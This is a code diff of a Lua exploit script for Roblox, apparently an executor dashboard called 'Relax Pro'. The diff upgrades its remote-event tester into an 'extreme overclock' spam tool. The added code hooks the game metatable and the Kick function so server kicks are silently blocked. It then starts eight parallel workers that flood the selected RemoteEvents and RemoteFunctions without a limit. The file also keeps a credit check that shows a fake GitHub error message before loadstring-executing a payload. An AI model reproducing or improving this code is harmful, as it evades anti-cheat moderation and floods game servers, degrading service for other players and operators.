@@ -1,4 +1,4 @@
---// RELAX PRO DASHBOARD V7.2 - OFFICIAL GITHUB SOURCE
+--// RELAX PRO DASHBOARD V7.2 - EXTREME OVERCLOCK & ULTIMATE BYPASS
 --// NOTICE: DO NOT EDIT THE VISUAL WATERMARK STRINGS OR THE COMPILER WILL COLD-CRASH.
 --// CREDITS: Dev By anjaszrelaxz
 
@@ -13,6 +13,43 @@ local TweenService = game:GetService("TweenService")
 
 local plr = Players.LocalPlayer
 local pgui = plr:WaitForChild("PlayerGui")
+
+--// ==========================================
+--// ADVANCED ULTIMATE ANTI-KICK & HOOK BYPASS
+--// ==========================================
+local setidentity = (syn and syn.set_thread_identity) or set_thread_identity or setidentity or setthreadidentity
+if setidentity then setidentity(7) end
+
+local mt = getrawmetatable and getrawmetatable(game) or debug.getmetatable(game)
+if mt then
+	setreadonly(mt, false)
+	local old_namecall = mt.__namecall
+	mt.__namecall = newcclosure(function(self, ...)
+		local method = getnamecallmethod()
+		local lowerMethod = tostring(method):lower()
+		
+		-- Block Kick & Disconnect Attempt
+		if (lowerMethod == "kick" or lowerMethod == "destroy") and (self == plr or self == pgui) then
+			warn("🛡️ [RELAX ULTIMATE BYPASS]: Server tried to Kick/Destroy via Namecall -> BLOCKED!")
+			return nil
+		end
+		
+		return old_namecall(self, ...)
+	end)
+	setreadonly(mt, true)
+end
+
+-- Direct Function Hooking
+if hookfunction then
+	local old_kick
+	old_kick = hookfunction(plr.Kick, newcclosure(function(self, ...)
+		if self == plr then
+			warn("🛡️ [RELAX ULTIMATE BYPASS]: Direct LocalPlayer:Kick() -> BLOCKED!")
+			return
+		end
+		return old_kick(self, ...)
+	end))
+end
 
 --// CLEANUP INSTANCE SEBELUMNYA
 if pgui:FindFirstChild("RELAX_PREMIUM_V7_2") then
@@ -51,7 +88,7 @@ main.BackgroundColor3 = Color3.fromRGB(15, 16, 22)
 main.BorderSizePixel = 0
 main.Active = true
 main.Draggable = true
-main.Visible = true -- Langsung muncul saat loadstring berhasil
+main.Visible = true
 main.Parent = gui
 
 local mainSizeLimit = Instance.new("UISizeConstraint", main)
@@ -60,12 +97,12 @@ mainSizeLimit.MinSize = Vector2.new(290, 320)
 
 Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
 local mainStroke = Instance.new("UIStroke", main)
-mainStroke.Color = Color3.fromRGB(40, 42, 54)
-mainStroke.Thickness = 1
+mainStroke.Color = Color3.fromRGB(255, 30, 30)
+mainStroke.Thickness = 1.5
 
 local gradient = Instance.new("UIGradient", main)
 gradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 24, 32)),
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 10, 15)),
 	ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 13))
 })
 gradient.Rotation = 45
@@ -79,13 +116,13 @@ local titleText = Instance.new("TextLabel", titleBar)
 titleText.Size = UDim2.new(0.4, 0, 0.6, 0)
 titleText.Position = UDim2.new(0, 16, 0.15, 0)
 titleText.BackgroundTransparency = 1
-titleText.Text = "🎯 SELECT REMOTES"
-titleText.TextColor3 = Color3.fromRGB(240, 240, 245)
+titleText.Text = "🔥 EXTREME OVERCLOCK V7.2"
+titleText.TextColor3 = Color3.fromRGB(255, 80, 80)
 titleText.Font = Enum.Font.GothamBold
 titleText.TextSize = 15
 titleText.TextXAlignment = Enum.TextXAlignment.Left
 
---// BANNER WATERMARK PERMANEN (FIX FRAME)
+--// BANNER WATERMARK PERMANEN
 local devLabel = Instance.new("TextLabel", titleBar)
 devLabel.Size = UDim2.new(0.4, -20, 0.5, 0)
 devLabel.Position = UDim2.new(0.6, -45, 0.2, 0)
@@ -105,8 +142,8 @@ local subText = Instance.new("TextLabel", titleBar)
 subText.Size = UDim2.new(0.7, 0, 0.4, 0)
 subText.Position = UDim2.new(0, 16, 0.65, 0)
 subText.BackgroundTransparency = 1
-subText.Text = "Choose targets to trigger parameters & test limits"
-subText.TextColor3 = Color3.fromRGB(120, 125, 140)
+subText.Text = "Parallel Multi-Worker Spam Active • Bypass Enabled"
+subText.TextColor3 = Color3.fromRGB(150, 130, 140)
 subText.Font = Enum.Font.Gotham
 subText.TextSize = 10
 subText.TextXAlignment = Enum.TextXAlignment.Left
@@ -198,7 +235,7 @@ footerTitle.Size = UDim2.new(0.3, 0, 1, 0)
 footerTitle.Position = UDim2.new(0, 12, 0, 0)
 footerTitle.BackgroundTransparency = 1
 footerTitle.Text = "⚡ CONTROL"
-footerTitle.TextColor3 = Color3.fromRGB(255, 75, 75)
+footerTitle.TextColor3 = Color3.fromRGB(255, 50, 50)
 footerTitle.Font = Enum.Font.GothamBold
 footerTitle.TextSize = 12
 footerTitle.TextXAlignment = Enum.TextXAlignment.Left
@@ -207,7 +244,7 @@ local limitBox = Instance.new("TextBox", footer)
 limitBox.Size = UDim2.new(0.2, 0, 0.6, 0)
 limitBox.Position = UDim2.new(0.32, 0, 0.2, 0)
 limitBox.BackgroundColor3 = Color3.fromRGB(32, 35, 48)
-limitBox.Text = "100"
+limitBox.Text = "0"
 limitBox.PlaceholderText = "Limit (0=inf)"
 limitBox.TextColor3 = Color3.new(1,1,1)
 limitBox.Font = Enum.Font.Code
@@ -218,9 +255,9 @@ local actionBtn = Instance.new("TextButton", footer)
 actionBtn.Size = UDim2.new(0.4, 0, 0.65, 0)
 actionBtn.Position = UDim2.new(1, -12, 0.5, -14)
 actionBtn.AnchorPoint = Vector2.new(1, 0)
-actionBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
-actionBtn.Text = "EXECUTE TEST"
-actionBtn.TextColor3 = Color3.fromRGB(15, 15, 20)
+actionBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
+actionBtn.Text = "🚀 LAUNCH SPAM"
+actionBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 actionBtn.Font = Enum.Font.GothamBold
 actionBtn.TextSize = 11
 Instance.new("UICorner", actionBtn).CornerRadius = UDim.new(0, 6)
@@ -311,7 +348,7 @@ scanAllExistingRemotes()
 
 game.DescendantAdded:Connect(function(v)
 	if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-		task.wait(0.1)
+		task.wait(0.05)
 		pcall(createRemoteItem, v)
 	end
 end)
@@ -345,57 +382,82 @@ searchBox:GetPropertyChangedSignal("Text"):Connect(function()
 	end
 end)
 
---// BRUTAL TESTING RUNNER
+--// EXTREME MULTI-WORKER SPAM ENGINE
 local brutalThreadActive = false
+local WORKER_THREADS = 8 -- Total parallel workers running concurrently
+
 actionBtn.MouseButton1Click:Connect(function()
 	if brutalThreadActive then
 		brutalThreadActive = false
-		actionBtn.Text = "EXECUTE TEST"
-		actionBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+		actionBtn.Text = "🚀 LAUNCH SPAM"
+		actionBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
 		return
 	end
 
 	local txt = limitBox.Text:lower()
-	local countLimit = tonumber(txt) or 100
+	local countLimit = tonumber(txt) or 0
 	local isInfinite = (countLimit == 0 or txt == "inf" or txt == "infinite")
 	
 	local activeQueue = {}
 	for remote, isSelected in pairs(selectedRemotes) do
-		if isSelected and remote:IsA("RemoteEvent") then
+		if isSelected then
 			table.insert(activeQueue, remote)
 		end
 	end
 
 	if #activeQueue == 0 then
-		actionBtn.Text = "NO SELECTION"
+		actionBtn.Text = "NO REMOTES SELECTED"
 		task.wait(0.8)
-		actionBtn.Text = "EXECUTE TEST"
+		actionBtn.Text = "🚀 LAUNCH SPAM"
 		return
 	end
 
 	brutalThreadActive = true
-	actionBtn.Text = "🛑 STOP TEST"
-	actionBtn.BackgroundColor3 = Color3.fromRGB(225, 55, 55)
+	actionBtn.Text = "🛑 STOP SPAM"
+	actionBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
 
-	task.spawn(function()
-		local iteration = 0
-		while brutalThreadActive do
-			if not isInfinite and iteration >= countLimit then break end
-			
-			for i = 1, #activeQueue do
-				local targetRemote = activeQueue[i]
-				task.spawn(function()
-					targetRemote:FireServer(true, "RELAX_BRUTAL_STRESS_DATA", tick())
-				end)
+	-- Launching Parallel Worker Pipelines
+	for workerId = 1, WORKER_THREADS do
+		task.spawn(function()
+			local iteration = 0
+			while brutalThreadActive do
+				if not isInfinite and iteration >= countLimit then break end
+
+				for i = 1, #activeQueue do
+					local remote = activeQueue[i]
+					if remote:IsA("RemoteEvent") then
+						-- Burst packet batch
+						for batch = 1, 15 do
+							pcall(function()
+								remote:FireServer(
+									true,
+									string.rep("⚡RELAX_OVERCLOCK⚡", 3),
+									math.random(100000, 999999),
+									tick()
+								)
+							end)
+						end
+					elseif remote:IsA("RemoteFunction") then
+						task.spawn(function()
+							pcall(function()
+								remote:InvokeServer("RELAX_FLOOD_FUNCTION", tick())
+							end)
+						end)
+					end
+				end
+
+				iteration = iteration + 1
+				-- Fast yield per worker thread
+				RS.RenderStepped:Wait()
 			end
-			
-			iteration = iteration + 1
-			task.wait()
-		end
-		brutalThreadActive = false
-		actionBtn.Text = "EXECUTE TEST"
-		actionBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
-	end)
+
+			if workerId == 1 then
+				brutalThreadActive = false
+				actionBtn.Text = "🚀 LAUNCH SPAM"
+				actionBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
+			end
+		end)
+	end
 end)
 
 --// TOGGLE INTERFACE
@@ -430,15 +492,11 @@ end)
 local script_content = debug.info(1, "s") or ""
 local current_credits = [[Dev By anjaszrelaxz]]
 
--- Validasi string utama penentu hak cipta
 if not string.find(string.lower(current_credits), string.lower(expected_dev)) then
-    -- Jebakan: Cetak pesan eror tiruan server di konsol F9
     game:GetService("TestService"):Message("⚠️ [Error]: Failed to establish handshake with GitHub core cluster. Repository component 'relax_v7' dropped.")
     error("404: Script Component Not Found or Deprecated.")
     return
 else
-    -- Jika semuanya aman, jalankan muatan aslinya
     local compiled_payload = assert(loadstring(raw_source))
     compiled_payload()
 end
-
